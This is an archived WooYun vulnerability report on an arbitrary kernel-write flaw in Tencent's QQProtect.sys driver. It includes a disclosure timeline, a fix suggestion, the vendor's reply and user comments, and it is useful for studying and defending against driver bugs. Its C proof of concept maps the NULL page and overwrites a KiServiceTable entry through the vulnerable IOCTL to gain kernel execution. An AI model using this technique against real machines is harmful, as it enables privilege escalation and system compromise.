{"id": 25447, "wybug_id": "wooyun-2015-0104097", "wybug_title": "QQ驱动一处任意内核地址写漏洞导致提权", "wybug_corp": "腾讯", "wybug_author": "路人甲", "wybug_date": "2015-03-27 09:26", "wybug_open_date": "2015-06-25 14:48", "wybug_type": "权限提升", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动权限提升"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向公众公开  简要描述： QQProtect.sys对IoControlCode=22246c的处理逻辑不严谨，可导致对任意内核地址写数据，被恶意控制后会引发提权。 详细说明：  QQProtect.sys版本：2.10.7.3出问题的代码：\n\n未对Outputbuffer的地址进行有效性校验，即使传入内核地址，也会引发0x1c字节的数据拷贝。只要提前在Null地址分配可执行内存，就能将内核调用跳转到Null地址执行，实现提权。   漏洞证明：  \nvoid Fuzz2(HANDLE hDev){\ttypedef LONG (WINAPI*  NtAllocateVirtualMemory)(\t\tHANDLE ProcessHandle,\t\tPVOID *BaseAddress,\t\tULONG_PTR ZeroBits,\t\tPSIZE_T RegionSize,\t\tULONG AllocationType,\t\tULONG Protect);\tNtAllocateVirtualMemory fnAllocate = \t\t(NtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(_T(\"ntdll\")), \"NtAllocateVirtualMemory\");\tif(fnAllocate)\t{\t\tPBYTE pBase = (PBYTE)0x7;\t\tSIZE_T len = 0x1000;\t\tLONG lSucceed = fnAllocate(GetCurrentProcess(), (PVOID*)&pBase, 0, &len, 0x3000, PAGE_EXECUTE_READWRITE);\t}\tmemcpy(0, \"\\xcc\\xcc\", 2);\tDWORD dwReturned = 0;\tchar input[0x1000] = { 0 };\tchar output[4] = { 0 };\tDWORD d = 0x2238f5c9;\tmemcpy(input+4, &d, 4);\td = 0x0e;\tmemcpy(input+8, &d, 4);\tDeviceIoControl(hDev,\t\t0x22246c,\t\t(LPVOID)input,\t\t100,\t\t(LPVOID)0x80502ce4,// nt!KiServiceTable+0x64\t\t0,\t\t&dwReturned,\t\tNULL);}void Fuzz1(){\tLPCTSTR DevName = _T(\"\\\\\\\\.\\\\QQProtect\");\tHANDLE hDev = CreateFile(DevName,\t\tGENERIC_READ|GENERIC_WRITE,\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,\t\tNULL,\t\tOPEN_EXISTING,\t\tFILE_ATTRIBUTE_NORMAL,\t\tNULL);\tif( (HANDLE)-1 != hDev)\t{\t\tFuzz2(hDev);\t\tCloseHandle(hDev);\t}}\n漏洞利用后的效果：\n\n\n\n   修复方案：  对IoControlCode=22246c的逻辑处理，增加对参数地址的有效性验证。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-03-27 14:46 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-27 15:08 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  厂商确认了，怎么还在最新提交列表里面？    \n     2015-03-27 19:44 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  惊现提权神器    \n     2015-03-27 21:02 |    \t\tkevinchowsec \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:5        | 周凯文，信息安全爱好者。)\t\t \n  要牛逼了？    \n     2015-03-27 23:12 |    \t\tLynch \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:8        | 我爱挖掘机)\t\t \n  只给5 rank？妈的，要老子放大招吗？自保护一堆的漏洞，直接给你公开。    \n     2015-03-31 11:59 |    \t\t看灰机 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 1)\t\t \n  @Lynch 给你10000RK得了，企鹅每年给你专项拨款几个E。 量大分多，量小给5都是多。    \n     2015-06-25 18:29 |    \t\twhitehat \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 用心，認真，努力，負責任...)\t\t \n  神奇的路人甲啊     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}